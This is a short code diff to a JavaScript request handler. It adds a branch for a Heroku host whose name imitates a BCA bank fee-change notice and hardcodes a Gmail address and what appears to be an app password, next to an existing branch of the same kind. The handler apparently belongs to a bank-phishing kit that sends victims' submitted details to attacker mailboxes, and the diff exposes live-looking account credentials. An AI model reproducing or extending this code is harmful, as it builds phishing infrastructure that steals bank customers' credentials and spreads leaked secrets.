@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+     if (url == 'pilihan-terbaru-tarif-bca.herokuapp.com'){
+
+       email = 'linkb436@gmail.com'
+       pass = 'zrzwxakknlqhymxl'
+    }else
+    
     if (url == 'info-perubahan-tarif-bca.herokuapp.com'){
 
        email = 'bankbca335@gmail.com'
